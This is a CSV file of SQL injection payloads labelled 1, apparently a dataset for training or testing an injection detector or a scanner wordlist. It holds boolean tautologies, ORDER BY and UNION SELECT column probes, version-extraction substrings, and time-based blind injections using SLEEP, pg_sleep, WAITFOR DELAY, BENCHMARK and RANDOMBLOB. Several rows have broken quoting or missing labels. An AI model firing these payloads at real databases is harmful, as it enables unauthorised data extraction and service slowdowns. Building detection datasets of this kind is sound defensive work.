payload,label
OR 1=1,1
OR 1=0,1
OR x=x,1
OR x=y,1
OR 1=1#,1
OR 1=0#,1
OR x=x#,1
OR x=y#,1
OR 1=1--,1
OR 1=0--,1
OR x=x--,1
OR x=y--,1
OR 3409=3409 AND ('pytW' LIKE 'pytW,1
OR 3409=3409 AND ('pytW' LIKE 'pytY,1
HAVING 1=1,1
HAVING 1=0,1
HAVING 1=1#,1
HAVING 1=0#,1
HAVING 1=1--,1
HAVING 1=0--,1
AND 1=1,1
AND 1=0,1
AND 1=1--,1
AND 1=0--,1
AND 1=1#,1
AND 1=0#,1
AND 1=1 AND '%'=',1
AND 1=0 AND '%'=',1
AND 1083=1083 AND (1427=1427,1
AND 7506=9091 AND (5913=5913,1
AND 1083=1083 AND ('1427=1427,1
AND 7506=9091 AND ('5913=5913,1
AND 7300=7300 AND 'pKlZ'='pKlZ,1
AND 7300=7300 AND 'pKlZ'='pKlY,1
AND 7300=7300 AND ('pKlZ'='pKlZ,1
AND 7300=7300 AND ('pKlZ'='pKlY,1
AS INJECTX WHERE 1=1 AND 1=1,1
AS INJECTX WHERE 1=1 AND 1=0,1
AS INJECTX WHERE 1=1 AND 1=1#,1
AS INJECTX WHERE 1=1 AND 1=0#,1
AS INJECTX WHERE 1=1 AND 1=1--,1
AS INJECTX WHERE 1=1 AND 1=0--,1
WHERE 1=1 AND 1=1,1
WHERE 1=1 AND 1=0,1
WHERE 1=1 AND 1=1#,1
WHERE 1=1 AND 1=0#,1
WHERE 1=1 AND 1=1--,1
WHERE 1=1 AND 1=0--,1
ORDER BY 1--,1
ORDER BY 2--,1
ORDER BY 3--,1
ORDER BY 4--,1
ORDER BY 5--,1
ORDER BY 6--,1
ORDER BY 7--,1
ORDER BY 8--,1
ORDER BY 9--,1
ORDER BY 10--,1
ORDER BY 11--,1
ORDER BY 12--,1
ORDER BY 13--,1
ORDER BY 14--,1
ORDER BY 15--,1
ORDER BY 16--,1
ORDER BY 17--,1
ORDER BY 18--,1
ORDER BY 19--,1
ORDER BY 20--,1
ORDER BY 21--,1
ORDER BY 22--,1
ORDER BY 23--,1
ORDER BY 24--,1
ORDER BY 25--,1
ORDER BY 26--,1
ORDER BY 27--,1
ORDER BY 28--,1
ORDER BY 29--,1
ORDER BY 30--,1
ORDER BY 31337--,1
ORDER BY 1#,1
ORDER BY 2#,1
ORDER BY 3#,1
ORDER BY 4#,1
ORDER BY 5#,1
ORDER BY 6#,1
ORDER BY 7#,1
ORDER BY 8#,1
ORDER BY 9#,1
ORDER BY 10#,1
ORDER BY 11#,1
ORDER BY 12#,1
ORDER BY 13#,1
ORDER BY 14#,1
ORDER BY 15#,1
ORDER BY 16#,1
ORDER BY 17#,1
ORDER BY 18#,1
ORDER BY 19#,1
ORDER BY 20#,1
ORDER BY 21#,1
ORDER BY 22#,1
ORDER BY 23#,1
ORDER BY 24#,1
ORDER BY 25#,1
ORDER BY 26#,1
ORDER BY 27#,1
ORDER BY 28#,1
ORDER BY 29#,1
ORDER BY 30#,1
ORDER BY 31337#,1
ORDER BY 1,1
ORDER BY 2,1
ORDER BY 3,1
ORDER BY 4,1
ORDER BY 5,1
ORDER BY 6,1
ORDER BY 7,1
ORDER BY 8,1
ORDER BY 9,1
ORDER BY 10,1
ORDER BY 11,1
ORDER BY 12,1
ORDER BY 13,1
ORDER BY 14,1
ORDER BY 15,1
ORDER BY 16,1
ORDER BY 17,1
ORDER BY 18,1
ORDER BY 19,1
ORDER BY 20,1
ORDER BY 21,1
ORDER BY 22,1
ORDER BY 23,1
ORDER BY 24,1
ORDER BY 25,1
ORDER BY 26,1
ORDER BY 27,1
ORDER BY 28,1
ORDER BY 29,1
ORDER BY 30,1
ORDER BY 31337,1
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
%' AND 8310=8310 AND '%'=',1
%' AND 8310=8311 AND '%'=',1
"and (select substring(@@version,1,1))='X'",1
"and (select substring(@@version,1,1))='M'",1
"and (select substring(@@version,2,1))='i'",1
"and (select substring(@@version,2,1))='y'",1
"and (select substring(@@version,3,1))='c'",1
"and (select substring(@@version,3,1))='S'",1
"and (select substring(@@version,3,1))='X'",1
# from wapiti,1
sleep(5)#,1
1 or sleep(5)#,1
" or sleep(5)#
' or sleep(5)#
 or sleep(5)=""",1
 or sleep(5)=',1
1) or sleep(5)#,1
) or sleep(5)=,1
) or sleep(5)=',1
1)) or sleep(5)#,1
)) or sleep(5)=,1
)) or sleep(5)=',1
;waitfor delay '0:0:5'--,1
);waitfor delay '0:0:5'--,1
;waitfor delay '0:0:5'--,1
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--",1
));waitfor delay '0:0:5'--,1
));waitfor delay '0:0:5'--,1
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
 or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#",1
"1) or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
)) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#",1
pg_sleep(5)--,1
1 or pg_sleep(5)--,1
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
) or pg_sleep(5)--",1
) or pg_sleep(5)--,1
1)) or pg_sleep(5)--,1
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)=",1
SLEEP(5)=',1
or SLEEP(5),1
or SLEEP(5)#,1
or SLEEP(5)--,1
"or SLEEP(5)=""",1
or SLEEP(5)=',1
waitfor delay '00:00:05',1
waitfor delay '00:00:05'--,1
waitfor delay '00:00:05'#,1
"benchmark(50000000,MD5(1))",1
"benchmark(50000000,MD5(1))--",1
"benchmark(50000000,MD5(1))#",1
"or benchmark(50000000,MD5(1))",1
"or benchmark(50000000,MD5(1))--",1
"or benchmark(50000000,MD5(1))#",1
pg_SLEEP(5),1
pg_SLEEP(5)--,1
pg_SLEEP(5)#,1
or pg_SLEEP(5),1
or pg_SLEEP(5)--,1
or pg_SLEEP(5)#,1
"\""",1
AnD SLEEP(5),1
AnD SLEEP(5)--,1
AnD SLEEP(5)#,1
&&SLEEP(5),1
&&SLEEP(5)--,1
&&SLEEP(5)#,1
 AnD SLEEP(5) ANd '1,1
&&SLEEP(5)&&'1,1
ORDER BY SLEEP(5),1
ORDER BY SLEEP(5)--,1
ORDER BY SLEEP(5)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,1
RANDOMBLOB(500000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",1
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",1
RANDOMBLOB(1000000000/2),1
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",1
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",1
ORDER BY SLEEP(5),1
"ORDER BY 1,SLEEP(5)",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
ORDER BY SLEEP(5)#,1
"ORDER BY 1,SLEEP(5)#",1
"ORDER BY 1,SLEEP(5),3#",1
"ORDER BY 1,SLEEP(5),3,4#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1
ORDER BY SLEEP(5)--,1
"ORDER BY 1,SLEEP(5)--",1
"ORDER BY 1,SLEEP(5),3--",1
"ORDER BY 1,SLEEP(5),3,4--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",1
UNION ALL SELECT 1,1
"UNION ALL SELECT 1,2",1
"UNION ALL SELECT 1,2,3",1
"UNION ALL SELECT 1,2,3,4",1
"UNION ALL SELECT 1,2,3,4,5",1
"UNION ALL SELECT 1,2,3,4,5,6",1
"UNION ALL SELECT 1,2,3,4,5,6,7",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
UNION ALL SELECT 1#,1
"UNION ALL SELECT 1,2#",1
"UNION ALL SELECT 1,2,3#",1
"UNION ALL SELECT 1,2,3,4#",1
"UNION ALL SELECT 1,2,3,4,5#",1
"UNION ALL SELECT 1,2,3,4,5,6#",1
"UNION ALL SELECT 1,2,3,4,5,6,7#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1
UNION ALL SELECT 1--,1
"UNION ALL SELECT 1,2--",1
"UNION ALL SELECT 1,2,3--",1
"UNION ALL SELECT 1,2,3,4--",1
"UNION ALL SELECT 1,2,3,4,5--",1
"UNION ALL SELECT 1,2,3,4,5,6--",1
"UNION ALL SELECT 1,2,3,4,5,6,7--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",1
"UNION SELECT @@VERSION,SLEEP(5),3",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),4",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1
